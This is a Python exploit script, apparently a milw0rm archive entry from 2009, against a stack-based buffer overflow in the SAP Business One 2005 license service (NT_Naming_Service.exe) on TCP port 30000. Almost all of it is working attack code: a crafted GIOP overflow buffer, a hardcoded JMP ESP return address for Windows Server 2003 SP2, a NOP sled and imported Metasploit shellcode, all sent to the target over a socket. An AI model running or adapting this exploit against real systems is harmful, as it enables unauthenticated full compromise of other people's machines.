#!/usr/bin/python
import socket, time

from payload import buf
import socket

def shell_attack(target_machine, target_port):
#########################################INFO################################################
# NT_Naming_Service.exe (License Manager 2005 for SAP Business One 2005-A) is               #
# vulnerable to a stack-based buffer overflow allowing for full system compromise by        #
# an unauthenticated user that has TCP/IP access to SAP's license service on TCP port 30000.#
# Mike Arnold ---> mikey27 .::at::. hotmail.com                                             #
############################################################################################





#metasploit windows/exec - notepad.exe x86/shikata_ga_nai 152 bytes
    

    #JMP ESP 0x773a73fb User32.dll - Server2k3 R2 STD/ENT - SP2
    ret = b'\xfb\x73\x3a\x77'
    giop_header = b'\x47\x49\x4f\x50\x01\x00\x01\x00'
    buff = giop_header + b'\x2f\x5c' * 500 + b"A" * 24 + ret + b'\x90' * 44 + buf + b'\x90' * 384


    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect ((target_machine,target_port))
    s.setblocking(0)

    s.send(buff)
    time.sleep(1)
    print ("done!")

    s.close()

    # milw0rm.com [2009-08-01]